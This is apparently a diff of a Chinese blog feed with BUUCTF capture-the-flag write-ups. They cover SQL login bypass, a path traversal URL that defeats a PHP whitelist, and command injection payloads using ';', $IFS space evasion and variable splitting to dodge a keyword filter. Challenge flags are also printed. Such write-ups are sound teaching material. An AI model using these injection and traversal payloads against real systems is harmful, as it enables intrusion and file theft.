+<p>数据交互点明显在页面上。验证SQL语句的闭合方式。</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714460320935.png" alt="1714460320935"></p>
+<p>判断出来为单引号。</p>
+<p>尝试使用万能密码。</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714460683481.png" alt="1714460683481"></p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714460693162.png" alt="1714460693162"></p>
+<p>成功 <code>flag&#123;6ff105e8-e7ac-4cd0-9f14-14d8f41db6db&#125;</code></p>
+</details>
+
+<details>
+<summary>[极客大挑战 2019]Havefun</summary>
+
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714461027021.png" alt="1714461027021"><br>页面上没有什么有用的信息。<br>查看一下前端：<br><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714461210520.png" alt="1714461210520"></p>
+<p>尝试传入cat&#x3D;dog</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714461280981.png" alt="1714461280981"></p>
+<p>成功 <code>flag&#123;9b385537-e339-4d47-ac68-10fcc3c9217c&#125;</code></p>
+</details>
+
+<details>
+<summary>[HCTF 2018]WarmUp</summary>
+
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714462460575.png" alt="1714462460575"><br>页面同样是没有什么有用的信息。</p>
+<p>查看前端源码：</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714462534879.png" alt="1714462534879"></p>
+<p>里面提到了source.php，那就前往source.php看看</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714462574772.png" alt="1714462574772"></p>
+<p>出现了php源码，里面提到了还有一个hint.php，前往hint.php</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714462636641.png" alt="1714462636641"></p>
+<p>提示flag的文件名是ffffllllaaaagggg。</p>
+<p>回头查看source.php的信息</p>
+<ul>
+<li><code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code>: 这是一个白名单数组，只有数组中的文件名才被允许访问。</li>
+<li><code>if (! isset($page) || !is_string($page))</code>: 检查 <code>$page</code> 变量是否已设置，并且确保它是一个字符串。</li>
+<li><code>if (in_array($page, $whitelist))</code>: 检查 <code>$page</code> 是否直接在白名单数组中。</li>
+<li><code>$_page = mb_substr($page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;))</code>: 这行代码试图去除查询字符串之后的部分，只留下文件名。</li>
+<li><code>if (in_array($_page, $whitelist))</code>: 再次检查处理后的文件名是否在白名单中。</li>
+<li><code>$_page = urldecode($page)</code>: 对 <code>$page</code> 进行 URL 解码，以防有编码过的字符。</li>
+<li><code>echo &quot;you can&#39;t see it&quot;</code>: 如果文件不在白名单中，输出这个信息。</li>
+<li><code>include $_REQUEST[&#39;file&#39;]</code>: 如果文件检查通过，包含并执行该文件。</li>
+</ul>
+<p>一共进行了四次过滤，因此构建 <code>http://d4284bb3-a9a4-46be-9050-f86dd118bdb6.node5.buuoj.cn:81/source.php?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
+<p>成功。<code>flag&#123;8a16c171-c3a7-4dc0-8e6f-9d1892970174&#125;</code></p>
+</details>
+<details>
+<summary>[GXYCTF2019]Ping Ping Ping</summary>
+
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715129842819.png" alt="1715129842819"><br>看起来应该是一个指令注入<br>界面提示传入ip，先尝试正常使用<br><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715129922073.png" alt="1715129922073"><br>正常<br>指令注入可以使用 <code>&amp;&amp; || ；</code>间隔开。<code>&amp;&amp;</code>的含义是：如果前面的指令执行成功则执行后面的指令：<code>a&amp;&amp;b  a执行成功后则执行b</code>。<code>||</code>的含义是：如果前面的指令执行失败后则执行后者：<code>a||b a执行失败后才执行b</code>。<code>；</code>的含义是：前后指令按顺序执行：<code>a；b  先执行a再执行b</code>。<br>基于以上信息，构建 <code>?ip=127.0.0.1;whoami</code><br><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715132909524.png" alt="1715132909524"></p>
+<p>注入成功。</p>
+<p>构建语句为 <code>/?ip=127.0.0.1;ls</code>查看当前目录下的文件。</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715133089504.png" alt="1715133089504"></p>
+<p>发现 <code>flag.php</code></p>
+<p>构建语句 <code>/?ip=127.0.0.1;cat%20flag.php</code></p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715133166932.png" alt="1715133166932"></p>
+<p><del>不给就不给怎么还骂人</del></p>
+<p><code>%20 </code>被过滤，用 <code>$IFS</code>代替空格，构建 <code>/?ip=127.0.0.1;cat$IFS$1flag.php</code>。里面$1代表传入的第一个参数，也就是 <code>flag.php</code>。</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715133754043.png" alt="1715133754043"></p>
+<p><del>怎么又骂人</del></p>
+<p>flag也被过滤。尝试了多种间隔符都没有解决。</p>
+<p>转换思路，看看 <code>index.php</code>里面有什么东西。构建 <code>/?ip=127.0.0.1;cat$IFS$1index.php</code></p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715133815963.png" alt="1715133815963"></p>
+<p>里面提示了关于过滤的规则。</p>
+<ul>
+<li>如果 <code>$ip</code> 中包含空格，输出 “fxck your space!” 并终止执行。</li>
+<li>如果 <code>$ip</code> 中包含字符串 “bash”，输出 “fxck your bash!” 并终止执行。</li>
+<li>如果 <code>$ip</code> 中包含字符串 “flag”（不区分大小写），输出 “fxck your flag!” 并终止执行。</li>
+</ul>
+<p>那么尝试拆解一下flag <code>/?ip=127.0.0.1;b=lag;cat$IFS$1f$b.php</code></p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715134729614.png" alt="1715134729614"></p>
+<p>没有回显，但是没有报错 <del>开始怀疑人生</del></p>
+<p>然后不知道经过多长时间才发现flag在F12里</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715134852929.png" alt="1715134852929"></p>
+<p>成功。<code>flag&#123;38db704f-52e3-4eb2-b399-78fd63d72d8c&#125;</code></p>
+</details>
+
+<details>
+<summary>[ACTF2020 新生赛]Exec</summary>
+
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715235491175.png" alt="1715235491175"></p>
+<p>一眼指令注入。</p>
+<p>先尝试正常操作。</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715235556702.png" alt="1715235556702"></p>
+<p>没什么问题，开始加引号分离指令。</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715235600533.png" alt="1715235600533"></p>
+<p>尝试查看当前目录下的文件。</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715235655015.png" alt="1715235655015"></p>
+<p>发现只有index.php</p>
+<p>尝试cat一下index.php里的内容</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237202067.png" alt="1715237202067"></p>
+<p>应该就是当前的页面</p>
+<p>用 <code>ls -a</code>查看有没有隐藏的文件</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237274905.png" alt="1715237274905"></p>
+<p>没有，于是考虑用 <code>ls ../</code>查看上层文件</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237442872.png" alt="1715237442872"></p>
+<p>再往上</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237484105.png" alt="1715237484105"></p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237508985.png" alt="1715237508985"></p>
+<p>发现了flag</p>
+<p>再往上返回的结果就完全一样了，说明flag所在的位置在最顶层目录中，于是构建 <code>127.0.0.1;cat /flag</code></p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237666632.png" alt="1715237666632"></p>
+<p>成功。<code>flag&#123;63e5105c-9bcf-4910-96d0-559eb4e18961&#125;</code></p>
+</details>
+
+</details>
+
+<details>
+<summary>Misc</summary>
+
+<details>
+<summary>[NewStarCTF 公开赛赛道]Whats HTTP</summary>
+
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715137041959.png" alt="1715137041959"></p>
+<p>过滤出http报文。</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715137295220.png" alt="1715137295220"></p>
+<p>因为如果回执报文是404的话，报文长度一定都是一样的，所以把过滤后的报文按顺序排列，着重查看状态码为200的报文。或者直接筛选出状态码为报文 <code>http.response.code == 200</code></p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715137533601.png" alt="1715137533601"><br>发现了一个长度异常的报文，经过查看请求报文发现是get了sssssercet，看起来是有用的信息</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715137597234.png" alt="1715137597234"></p>
+<p>提取出回执的data <code>4e6a5932597a59784e6a6333596a4d304e6a597a4d7a4d7a4d7a597a4e444d354e6a517a4d444d7a4d7a41324d7a4d324d7a637a4e7a4d344d7a517a4d6a4d324d7a6b7a4e7a4d784e6a497a4e544d304e6a51324e444d334d7a49324e54597a4e6a55335a413d3d</code></p>
+<p>一眼hex。-&gt;<code>NjY2YzYxNjc3YjM0NjYzMzMzMzYzNDM5NjQzMDMzMzA2MzM2MzczNzM4MzQzMjM2MzkzNzMxNjIzNTM0NjQ2NDM3MzI2NTYzNjU3ZA==</code></p>
+<p>一眼base64。-&gt;<code>666c61677b34663333363439643033306336373738343236393731623534646437326563657d</code></p>
+<p>又是hex。-&gt;<code>flag&#123;4f33649d030c6778426971b54dd72ece&#125;</code></p>
+<p>完成。<code>flag&#123;4f33649d030c6778426971b54dd72ece&#125;</code></p>
+</details>
+
+<details>
+<summary>[NewStarCTF 2023 公开赛道]流量！鲨鱼！</summary>
+
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715138777415.png" alt="1715138777415"><br>筛选出http报文<br><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715138836304.png" alt="1715138836304"></p>
+<p>发现了一个奇怪的报文: <code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</code></p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715138858169.png" alt="1715138858169"></p>
+<p>查看一下对应的请求报文</p>
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715138901713.png" alt="1715138901713"></p>
+<p>请求报文是在控制台注入了linux命令，是用base64编码以base64的编码格式输出ffffllllllll11111144444GGGGGG里的内容。实质上也就是对ffffllllllll11111144444GGGGGG的内容作两次base64加密。</p>
+<p>完成。<code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p>
+</details>
+
+</details>
+]]></content>
+      <categories>
+        <category>CTF学习</category>
       </categories>
       <tags>
         <tag>自学</tag>
